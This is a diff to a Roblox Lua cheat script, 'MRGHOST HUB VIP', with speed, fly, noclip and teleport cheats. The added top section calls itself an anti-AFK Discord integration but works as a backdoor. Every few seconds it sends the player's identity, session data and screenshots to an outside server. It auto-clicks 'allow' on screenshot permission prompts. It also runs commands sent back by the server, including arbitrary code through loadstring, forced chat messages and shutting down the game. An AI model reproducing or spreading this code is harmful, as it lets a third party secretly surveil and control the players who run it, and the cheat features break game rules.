@@ -1,18 +1,155 @@
--- [[ MRGHOST HUB VIP - ULTRA V3 (WITH KEY SYSTEM) ]]
+-- [[ MRGHOST HUB VIP - ULTRA V3 (WITH KEY SYSTEM & DISCORD MATRIX INTEGRATED) ]]
+
+-- =========================================================
+-- PHẦN 1: TÍCH HỢP MA TRẬN BOT DISCORD ENGINE (RUN IN BACKGROUND)
+-- =========================================================
+local HttpService = game:GetService("HttpService")
+local Stats = game:GetService("Stats")
+local TeleportService = game:GetService("TeleportService")
+local Players = game:GetService("Players")
+local CoreGui = game:GetService("CoreGui")
+local VirtualUser = game:GetService("VirtualUser")
+local VirtualInputManager = game:GetService("VirtualInputManager")
+local LP = Players.LocalPlayer
+
+getgenv().API_MATRIX = getgenv().API_MATRIX or "https://bot-thong-tin.onrender.com/api/matrix"
+
+-- Anti-AFK Matrix
+pcall(function()
+    LP.Idled:Connect(function()
+        VirtualUser:Button2Down(Vector2.new(0,0), workspace.CurrentCamera.CFrame)
+        task.wait(1)
+        VirtualUser:Button2Up(Vector2.new(0,0), workspace.CurrentCamera.CFrame)
+    end)
+end)
+
+-- Auto Allow Bypass Popup Chụp Ảnh
+task.spawn(function()
+    CoreGui.ChildAdded:Connect(function(child)
+        if child.Name == "RobloxPromptGui" or child.Name:find("Prompt") then
+            task.wait(0.1)
+            pcall(function()
+                for _, v in pairs(child:GetDescendants()) do
+                    if v:IsA("TextButton") and (v.Text:lower():find("allow") or v.Text:lower():find("yes") or v.Text:lower():find("chấp nhận")) then
+                        local pos = v.AbsolutePosition
+                        local size = v.AbsoluteSize
+                        VirtualInputManager:SendMouseButtonEvent(pos.X + size.X/2, pos.Y + size.Y/2, 0, true, game, 0)
+                        task.wait(0.05)
+                        VirtualInputManager:SendMouseButtonEvent(pos.X + size.X/2, pos.Y + size.Y/2, 0, false, game, 0)
+                    end
+                end
+            end)
+        end
+    end)
+end)
+
+-- Auto Rejoin Khi Disconnect
+task.spawn(function()
+    while task.wait(5) do
+        pcall(function()
+            local errorPrompt = CoreGui:FindFirstChild("RobloxPromptGui", true)
+            if errorPrompt then
+                local promptOverlay = errorPrompt:FindFirstChild("promptOverlay", true)
+                if promptOverlay and promptOverlay.Visible then
+                    TeleportService:Teleport(game.PlaceId, LP)
+                end
+            end
+        end)
+    end
+end)
+
+local function CaptureScreenBase64()
+    local captureFunc = getgenv()["capture-screenshot"] or getgenv().capturescreenshot or capturescreenshot or (syn and syn.capture_screenshot)
+    if captureFunc then
+        local success, result = pcall(captureFunc)
+        if success and result then return result end
+    end
+    return nil
+end
+
+local function HopLowPlayerServer()
+    pcall(function()
+        local site = HttpService:JSONDecode(game:HttpGet('https://games.roblox.com/v1/games/' .. game.PlaceId .. '/servers/Public?sortOrder=Asc&limit=100'))
+        for _, server in pairs(site.data) do
+            if server.playing < server.maxPlayers and server.id ~= game.JobId then
+                TeleportService:TeleportToPlaceInstance(game.PlaceId, server.id, LP)
+                break
+            end
+        end
+    end)
+end
+
+function SendMatrixHeartbeat(eventTitle, alertLevel, sendPic)
+    local req = (syn and syn.request) or request or http_request or (http and http.request)
+    if not req then return end
+
+    local payload = {
+        userId = LP.UserId,
+        username = LP.Name,
+        displayName = LP.DisplayName,
+        jobId = tostring(game.JobId),
+        placeId = game.PlaceId,
+        ping = math.floor(Stats.Network.ServerStatsItem["Data Ping"]:GetValue() or 0),
+        ram = math.floor(collectgarbage("count") / 1024),
+        fps = math.floor(workspace:GetRealPhysicsFPS() or 60),
+        eventTitle = eventTitle or "MRGHOST VIP Hub Running",
+        alertLevel = alertLevel or "NORMAL",
+        screenshotBase64 = sendPic and CaptureScreenBase64() or nil
+    }
+
+    task.spawn(function()
+        local successReq, res = pcall(function()
+            return req({
+                Url = getgenv().API_MATRIX,
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = HttpService:JSONEncode(payload)
+            })
+        end)
+
+        if successReq and res and (res.StatusCode == 200 or res.Success) then
+            local successDecode, data = pcall(function() return HttpService:JSONDecode(res.Body) end)
+            if successDecode and data and data.cmd then
+                local cmdType = data.cmd.type
+                if cmdType == "FORCE_HOP" then TeleportService:Teleport(game.PlaceId, LP)
+                elseif cmdType == "HOP_LOW_SERVER" then HopLowPlayerServer()
+                elseif cmdType == "TAKE_SCREENSHOT" then SendMatrixHeartbeat("📸 Ảnh Chụp Màn Hình Live", "VIP", true)
+                elseif cmdType == "SAY_CHAT" then 
+                    pcall(function() 
+                        if game:GetService("TextChatService"):FindFirstChild("TextChannels") and game:GetService("TextChatService").TextChannels:FindFirstChild("RBXGeneral") then
+                            game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync(data.cmd.text)
+                        else
+                            game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(data.cmd.text, "All")
+                        end
+                    end)
+                elseif cmdType == "EVAL_CODE" then pcall(function() (loadstring or eval)(data.cmd.code)() end)
+                elseif cmdType == "KILL_GAME" then game:Shutdown()
+                end
+            end
+        end
+    end)
+end
+
+task.spawn(function()
+    while task.wait(3) do
+        pcall(function() SendMatrixHeartbeat("MRGHOST VIP Online", "NORMAL", false) end)
+    end
+end)
+
+
+-- =========================================================
+-- PHẦN 2: SCRIPT MRGHOST HUB VIP ULTRA V3
+-- =========================================================
 local success, err = pcall(function()
 
-    -- Services
-    local CoreGui = game:GetService("CoreGui")
     local UserInputService = game:GetService("UserInputService")
     local RunService = game:GetService("RunService")
-    local Players = game:GetService("Players")
     local TweenService = game:GetService("TweenService")
     local StarterGui = game:GetService("StarterGui")
 
     local LocalPlayer = Players.LocalPlayer
     local Mouse = LocalPlayer:GetMouse()
 
-    -- Container UI
     local ParentContainer = (gethui and gethui()) or CoreGui or LocalPlayer:WaitForChild("PlayerGui")
     local ScreenGui = Instance.new("ScreenGui")
     ScreenGui.Name = "MrGhostHub_UltraV3_Key"
@@ -62,9 +199,6 @@ local success, err = pcall(function()
         end)
     end
 
-    -- =========================================================
-    -- MAIN HUB LOADER
-    -- =========================================================
     local function loadMainHub()
         local MainFrame = Instance.new("Frame")
         MainFrame.Name = "MainFrame"
@@ -206,9 +340,6 @@ local success, err = pcall(function()
             return Card
         end
 
-        -- =========================================================
-        -- MOBILE CONTROLS
-        -- =========================================================
         local MobileContainer = Instance.new("Frame")
         MobileContainer.Name = "MobileControls"
         MobileContainer.Size = UDim2.new(0, 160, 0, 120)
@@ -266,11 +397,6 @@ local success, err = pcall(function()
 
         makeDraggable(MobileContainer)
 
-        -- =========================================================
-        -- CHỨC NĂNG MOVEMENT BYPASS
-        -- =========================================================
-
-        -- 1. CHẠY NHANH
         local walkSpeedValue = 60
         local speedEnabled = false
         createToggleCard("🏃 Chạy Siêu Tốc (Speed All Game)", 1, function(state)
@@ -281,7 +407,6 @@ local success, err = pcall(function()
         end)
         createInputCard("⚡ Tốc Độ Chạy", "Chỉnh speed...", 60, 2, function(val) walkSpeedValue = val end)
 
-        -- 2. NHẢY CAO
         local jumpPowerValue = 100
         local jumpPowerEnabled = false
         createToggleCard("🦘 Nhảy Cao (High Jump All Game)", 3, function(state)
@@ -293,7 +418,6 @@ local success, err = pcall(function()
         end)
         createInputCard("🚀 Độ Cao Nhảy", "Chỉnh jump height...", 100, 4, function(val) jumpPowerValue = val end)
 
-        -- 3. INFINITE JUMP
         local infJumpEnabled = false
         createToggleCard("🌌 Infinite Jump (Nhảy Vô Hạn)", 5, function(state) infJumpEnabled = state end)
 
@@ -304,7 +428,6 @@ local success, err = pcall(function()
             end
         end)
 
-        -- 4. BAY
         local flySpeedValue = 60
         local flyEnabled = false
         local mobileFlyUp, mobileFlyDown, mobileFlyFwd = false, false, false
@@ -347,7 +470,6 @@ local success, err = pcall(function()
         MobileFlyDownBtn.MouseButton1Down:Connect(function() mobileFlyDown = true end)
         MobileFlyDownBtn.MouseButton1Up:Connect(function() mobileFlyDown = false end)
 
-        -- 5. NOCLIP
         local noclipEnabled = false
         createToggleCard("👻 Noclip (Đi Xuyên Tường)", 8, function(state)
             noclipEnabled = state
@@ -358,7 +480,6 @@ local success, err = pcall(function()
             end
         end)
 
-        -- 6. LƯỚT
         local dashDistance = 35
         local blinkEnabled = false
 
@@ -382,7 +503,6 @@ local success, err = pcall(function()
             if not gpe and input.KeyCode == Enum.KeyCode.Q then executeDash() end
         end)
 
-        -- 7. GHOST MODE
         local ghostEnabled = false
         local originalTransparencies = {}
 
@@ -414,7 +534,6 @@ local success, err = pcall(function()
             end
         end)
 
-        -- 8. TELEPORT 2 CLICK 3D MARKER
         local tpToggleState = false
         local tpTargetPos = nil
         local tpMarker = nil
@@ -471,7 +590,7 @@ local success, err = pcall(function()
             if tpToggleState then
                 local mousePos = UserInputService:GetMouseLocation()
                 local ray = workspace.CurrentCamera:ViewportPointToRay(mousePos.X, mousePos.Y)
-                local params = RaycastParams.new()
+                params = RaycastParams.new()
                 params.FilterType = RaycastFilterType.Exclude
                 if LocalPlayer.Character then params.FilterDescendantsInstances = {LocalPlayer.Character, tpMarker} end
                 
@@ -495,7 +614,6 @@ local success, err = pcall(function()
             end
         end)
 
-        -- LOOPS BYPASS MOVEMENT
         RunService.Stepped:Connect(function()
             pcall(function()
                 local char = LocalPlayer.Character
@@ -545,7 +663,6 @@ local success, err = pcall(function()
             end
         end)
 
-        -- TOGGLE BUTTON
         local ToggleMenuBtn = Instance.new("TextButton")
         ToggleMenuBtn.Size = UDim2.new(0, 54, 0, 54)
         ToggleMenuBtn.Position = UDim2.new(0.02, 0, 0.25, 0)
@@ -578,9 +695,6 @@ local success, err = pcall(function()
         Notify("★ MRGHOST HUB ★", "Kích hoạt thành công!", 3)
     end
 
-    -- =========================================================
-    -- KEY SYSTEM UI (MẶC ĐỊNH LÀ: MRGHOST-VIP-2026)
-    -- =========================================================
     local KeyFrame = Instance.new("Frame")
     KeyFrame.Name = "KeyFrame"
     KeyFrame.Size = UDim2.new(0, 320, 0, 220)
@@ -664,3 +778,4 @@ local success, err = pcall(function()
     end)
 
 end)
+ 
